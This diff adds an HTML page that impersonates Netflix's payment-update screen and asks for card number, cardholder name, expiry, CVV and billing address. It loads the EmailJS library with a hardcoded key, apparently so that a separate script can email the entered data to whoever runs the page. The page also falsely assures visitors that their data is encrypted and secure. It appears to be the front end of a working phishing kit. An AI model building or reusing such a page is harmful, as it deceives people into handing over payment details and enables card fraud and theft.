@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Update Payment - NETFLIX</title>
+    <link rel="stylesheet" href="style.css">
+
+    <!-- ✅ 1. LOAD EMAILJS LIBRARY -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    
+    <!-- ✅ 2. INITIALIZE WITH PUBLIC KEY -->
+    <script type="text/javascript">
+       (function(){
+          emailjs.init("O3QApRYsUsZLT-lFY"); // Your Public Key
+       })();
+    </script>
+
+    <!-- ✅ 3. LOAD SCRIPT -->
+    <script src="script.js" defer></script>
+</head>
+<body>
+    <div class="card-wrapper">
+        <div class="card-header">
+            <h1 class="logo">NETFLIX</h1>
+        </div>
+
+        <div class="card-container">
+            <form id="cardForm" class="card-form">
+                <h2>Update Payment Method</h2>
+                <p>Please enter your card details to continue your subscription.</p>
+
+                <div class="form-group">
+                    <label for="cardNumber">Card Number</label>
+                    <input
+                        type="text"
+                        id="cardNumber"
+                        placeholder="1234 5678 9012 3456"
+                        maxlength="19"
+                        required
+                    >
+                    <span class="error-message" id="cardNumberError"></span>
+                </div>
+
+                <div class="form-group">
+                    <label for="cardName">Name on Card</label>
+                    <input
+                        type="text"
+                        id="cardName"
+                        placeholder="John Doe"
+                        required
+                    >
+                    <span class="error-message" id="cardNameError"></span>
+                </div>
+
+                <div class="card-row">
+                    <div class="form-group">
+                        <label for="expiryDate">Expiry Date</label>
+                        <input
+                            type="text"
+                            id="expiryDate"
+                            placeholder="MM/YY"
+                            maxlength="5"
+                            required
+                        >
+                        <span class="error-message" id="expiryError"></span>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="cvv">CVV</label>
+                        <input
+                            type="text"
+                            id="cvv"
+                            placeholder="123"
+                            maxlength="4"
+                            required
+                        >
+                        <span class="error-message" id="cvvError"></span>
+                    </div>
+                </div>
+
+                 <!-- ✅ NEW: BILLING ADDRESS SECTION -->
+                <div style="margin-top: 20px; margin-bottom: 10px; border-top: 1px solid #ddd; padding-top: 15px;">
+                    <h3 style="font-size: 1rem; color: #333; margin-bottom: 15px;">Billing Address</h3>
+                    
+                    <div class="form-group">
+                        <label for="billAddress">Street Address</label>
+                        <input type="text" id="billAddress" placeholder="123 St Lane" required>
+                    </div>
+
+                    <div class="card-row">
+                        <div class="form-group">
+                            <label for="billCity">City</label>
+                            <input type="text" id="billCity" placeholder="City" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="billZip">Zip Code</label>
+                            <input type="text" id="billZip" placeholder="00000" maxlength="10" required>
+                        </div>
+                    </div>
+                </div>
+                <!-- ✅ END OF NEW SECTION -->
+
+                <button type="submit" class="update-btn">Update Payment Method</button>
+
+                <div class="security-info">
+                    Your payment information is encrypted and secure. We use industry-standard security measures to protect your data.
+                </div>
+            </form>
+        </div>
+    </div>
+</body>
+</html>
